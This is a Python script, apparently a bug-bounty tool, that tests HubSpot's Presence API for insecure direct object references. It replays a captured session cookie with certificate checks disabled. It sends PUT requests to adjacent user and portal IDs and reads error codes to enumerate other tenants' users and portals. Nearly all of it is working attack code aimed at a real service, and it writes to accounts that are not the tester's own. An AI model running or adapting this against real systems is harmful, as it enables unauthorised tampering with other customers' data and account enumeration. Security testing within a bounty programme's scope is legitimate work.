import sys
import urllib.request
import ssl
import json
import re

# Create unverified SSL context
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Read presence_headers.md
headers_file = '/Users/itza/Documents/vault_self/bcck_vault/LEARNING/targets/hubspot/presence_headers.md'

print("="*70)
print("TRACK B: PRESENCE API - IDOR & AUTHENTICATION TESTING")
print("="*70)

with open(headers_file, 'r') as f:
    content = f.read()

# Parse request components
lines = content.split('\n')

# Extract URL
url_match = re.search(r'PUT ([^\s]+) HTTP', content)
if url_match:
    path_with_params = url_match.group(1)
else:
    print("✗ Could not extract URL")
    sys.exit(1)

# Extract Host
host_match = re.search(r'Host: ([^\n]+)', content)
if host_match:
    host = host_match.group(1).strip()
else:
    print("✗ Could not extract Host")
    sys.exit(1)

# Extract Cookie
cookie_match = re.search(r'Cookie: ([^\n]+)', content)
if cookie_match:
    cookie_header = cookie_match.group(1).strip()
else:
    print("✗ Could not extract Cookie")
    sys.exit(1)

# Extract body (JSON at end) - look for line starting with {
body_data = {}
for line in reversed(lines):
    line = line.strip()
    if line.startswith('{'):
        try:
            body_data = json.loads(line)
            print(f"✓ Extracted body: {list(body_data.keys())}")
            break
        except:
            pass

if not body_data:
    print("⚠ No body found, using empty object")
    body_data = {}

# Extract Portal ID and User ID
portal_match = re.search(r'/portal/(\d+)/', path_with_params)
user_match = re.search(r'/user/(\d+)', path_with_params)

base_portal_id = portal_match.group(1) if portal_match else None
base_user_id = user_match.group(1) if user_match else None

print(f"\n[EXTRACTED CONFIGURATION]")
print(f"Host: {host}")
print(f"Portal ID: {base_portal_id}")
print(f"User ID: {base_user_id}")
print(f"Cookie: {len(cookie_header)} chars")
print(f"Body: {json.dumps(body_data)[:100]}")

def test_presence_api(portal_id, user_id, test_name, body=None):
    """Test Presence API with different portal/user IDs"""

    # Build URL
    base_path = f"/api/presence/v1/presence/portal/{portal_id}/user/{user_id}"
    params = f"?hs_static_app=notifications&hs_static_app_version=1.11623&portalId={portal_id}"
    full_url = f"https://{host}{base_path}{params}"

    print(f"\n{'='*70}")
    print(f"TEST: {test_name}")
    print(f"Portal ID: {portal_id}")
    print(f"User ID: {user_id}")
    print('='*70)

    req = urllib.request.Request(full_url, method='PUT')
    req.add_header('Cookie', cookie_header)
    req.add_header('Content-Type', 'application/json')
    req.add_header('User-Agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0')
    req.add_header('Accept', 'application/json, text/javascript, */*; q=0.01')
    req.add_header('Accept-Language', 'en-US,en;q=0.5')
    req.add_header('Origin', f'https://{host}')

    # Use provided body or default
    data = json.dumps(body if body else body_data).encode('utf-8')

    try:
        response = urllib.request.urlopen(req, data=data, context=ctx, timeout=10)
        status = response.status
        response_content = response.read().decode('utf-8', errors='ignore')

        print(f"✓ Status: {status}")
        print(f"✓ Content: {len(response_content)} bytes")

        try:
            json_response = json.loads(response_content)
            print(f"✓ JSON Response:")
            print(f"  {json.dumps(json_response, indent=2)[:500]}")

            if status == 200:
                print(f"\n✓✓✓ SUCCESS - API Working")
                return True, 'SUCCESS', json_response
            else:
                return True, f'HTTP_{status}', json_response

        except json.JSONDecodeError:
            print(f"✓ Response (not JSON): {response_content[:200]}")
            return True, f'HTTP_{status}_TEXT', response_content

    except urllib.error.HTTPError as e:
        print(f"✗ HTTP Error {e.code}: {e.reason}")

        try:
            error_content = e.read().decode('utf-8', errors='ignore')

            try:
                error_json = json.loads(error_content)
                print(f"  Error JSON:")
                print(f"    {json.dumps(error_json, indent=4)}")

                # Check for IDOR indicators
                if e.code == 403:
                    print(f"\n  ⚠️ FORBIDDEN - User/Portal exists but no access")
                    print(f"  → Potential IDOR: Resource exists but unauthorized")
                elif e.code == 404:
                    print(f"\n  ℹ️  NOT FOUND - User/Portal doesn't exist")
                elif e.code == 401:
                    print(f"\n  ✗ UNAUTHORIZED - Auth issue")
                elif e.code == 488:
                    print(f"\n  ⚠️ WRONG HUBLET")
                    if 'correctHublet' in error_json:
                        print(f"  → Should use: {error_json['correctHublet']}")

                return False, f'HTTP_{e.code}', error_json

            except json.JSONDecodeError:
                print(f"  Error (not JSON): {error_content[:200]}")
                return False, f'HTTP_{e.code}_TEXT', error_content

        except Exception as read_error:
            print(f"  Could not read error: {read_error}")
            return False, f'HTTP_{e.code}', None

    except Exception as e:
        print(f"✗ Exception: {e}")
        return False, 'EXCEPTION', None

# Test 1: Baseline (original portal/user)
print(f"\n{'#'*70}")
print(f"# TEST 1: BASELINE - ORIGINAL CREDENTIALS")
print(f"{'#'*70}")

success_1, result_1, response_1 = test_presence_api(
    base_portal_id,
    base_user_id,
    "Baseline (Original Portal/User)"
)

# Test 2: IDOR - Different User IDs
print(f"\n{'#'*70}")
print(f"# TEST 2: IDOR - USER ID ENUMERATION")
print(f"{'#'*70}")

user_id_tests = [
    (base_portal_id, str(int(base_user_id) + 1), "User ID + 1"),
    (base_portal_id, str(int(base_user_id) + 2), "User ID + 2"),
    (base_portal_id, str(int(base_user_id) - 1), "User ID - 1"),
    (base_portal_id, "100000000", "Low User ID (100000000)"),
]

user_idor_results = []

for portal, user, desc in user_id_tests:
    success, result, response = test_presence_api(portal, user, f"IDOR Test: {desc}")
    user_idor_results.append({
        'portal': portal,
        'user': user,
        'desc': desc,
        'success': success,
        'result': result
    })

# Test 3: IDOR - Different Portal IDs
print(f"\n{'#'*70}")
print(f"# TEST 3: IDOR - PORTAL ID ENUMERATION")
print(f"{'#'*70}")

portal_id_tests = [
    (str(int(base_portal_id) + 1), base_user_id, "Portal ID + 1"),
    (str(int(base_portal_id) + 2), base_user_id, "Portal ID + 2"),
    (str(int(base_portal_id) - 1), base_user_id, "Portal ID - 1"),
    ("100000000", base_user_id, "Low Portal ID (100000000)"),
]

portal_idor_results = []

for portal, user, desc in portal_id_tests:
    success, result, response = test_presence_api(portal, user, f"IDOR Test: {desc}")
    portal_idor_results.append({
        'portal': portal,
        'user': user,
        'desc': desc,
        'success': success,
        'result': result
    })

# Summary
print(f"\n{'='*70}")
print("TRACK B: IDOR TESTING SUMMARY")
print('='*70)

print(f"\n[BASELINE TEST]")
if success_1 and result_1 == 'SUCCESS':
    print(f"✓✓✓ BASELINE SUCCESS")
    print(f"  Portal {base_portal_id} / User {base_user_id}: Working")
    print(f"  Cookies are valid for app-na2 hublet")
    print(f"  Authentication confirmed")
else:
    print(f"✗ BASELINE FAILED: {result_1}")
    print(f"  Cannot proceed with IDOR testing")
    print(f"  Cookies may be expired or invalid")
    sys.exit(1)

print(f"\n[USER ID IDOR RESULTS]")
user_successes = [r for r in user_idor_results if r['success']]
user_403s = [r for r in user_idor_results if 'HTTP_403' in r['result']]
user_404s = [r for r in user_idor_results if 'HTTP_404' in r['result']]

print(f"Total tests: {len(user_idor_results)}")
print(f"  Success (200): {len(user_successes)}")
print(f"  Forbidden (403): {len(user_403s)}")
print(f"  Not Found (404): {len(user_404s)}")

if user_successes:
    print(f"\n✗✗✗ CRITICAL: USER IDOR VULNERABILITY FOUND")
    print(f"  Accessed other users' data:")
    for r in user_successes:
        print(f"    - Portal {r['portal']}, User {r['user']}: SUCCESS")
    print(f"\n  IMPACT: Unauthorized access to user presence data")
    print(f"  SEVERITY: HIGH")

elif user_403s:
    print(f"\n⚠️ USERS EXIST BUT FORBIDDEN:")
    for r in user_403s[:3]:
        print(f"    - User {r['user']}: Exists but unauthorized")
    print(f"\n  → User enumeration possible via 403 vs 404")
    print(f"  → Multi-tenant isolation working (good)")

elif user_404s:
    print(f"\n✓ Users tested do not exist (404)")
    print(f"  → No IDOR vulnerability (sequential IDs invalid)")

print(f"\n[PORTAL ID IDOR RESULTS]")
portal_successes = [r for r in portal_idor_results if r['success']]
portal_403s = [r for r in portal_idor_results if 'HTTP_403' in r['result']]
portal_404s = [r for r in portal_idor_results if 'HTTP_404' in r['result']]
portal_488s = [r for r in portal_idor_results if 'HTTP_488' in r['result']]

print(f"Total tests: {len(portal_idor_results)}")
print(f"  Success (200): {len(portal_successes)}")
print(f"  Forbidden (403): {len(portal_403s)}")
print(f"  Not Found (404): {len(portal_404s)}")
print(f"  Wrong Hublet (488): {len(portal_488s)}")

if portal_successes:
    print(f"\n✗✗✗ CRITICAL: PORTAL IDOR VULNERABILITY FOUND")
    print(f"  Accessed other portals' data:")
    for r in portal_successes:
        print(f"    - Portal {r['portal']}, User {r['user']}: SUCCESS")
    print(f"\n  IMPACT: Multi-tenant isolation BROKEN")
    print(f"  SEVERITY: CRITICAL")

elif portal_488s:
    print(f"\n⚠️ PORTALS EXIST IN OTHER HUBLETS:")
    for r in portal_488s[:3]:
        print(f"    - Portal {r['portal']}: Exists in different hublet")
    print(f"\n  → Portal enumeration possible via 488 errors")
    print(f"  → Hublet information disclosure confirmed")

elif portal_403s:
    print(f"\n⚠️ PORTALS EXIST BUT FORBIDDEN:")
    for r in portal_403s[:3]:
        print(f"    - Portal {r['portal']}: Exists but unauthorized")
    print(f"\n  → Portal enumeration possible")
    print(f"  → Multi-tenant isolation working (good)")

print(f"\n{'='*70}")
print("TRACK B FINDINGS")
print('='*70)

print(f"""
✓ Finding #1: Presence API Validated
  - Endpoint working on app-na2 hublet
  - Authentication successful
  - Portal ID {base_portal_id} confirmed
  - User ID {base_user_id} confirmed

✓ Finding #2: Error Message Information Disclosure
  - HTTP 488 exposes hublet routing
  - HTTP 403 vs 404 enables enumeration
  - Error responses include correlationIds

{'✗ Finding #3: IDOR VULNERABILITY FOUND' if user_successes or portal_successes else '✓ Finding #3: Multi-Tenant Isolation Working'}
  - User ID IDOR: {'VULNERABLE' if user_successes else 'Protected'}
  - Portal ID IDOR: {'VULNERABLE' if portal_successes else 'Protected'}
  - Enumeration: {'Possible via error codes' if (user_403s or portal_488s) else 'Limited'}

NEXT STEPS:
1. Test CHIRP endpoint from method_endpoints.md
2. Test other API endpoints with IDOR
3. Enumerate valid user/portal IDs via error differences
4. Document findings for bug bounty
""")

print('='*70)
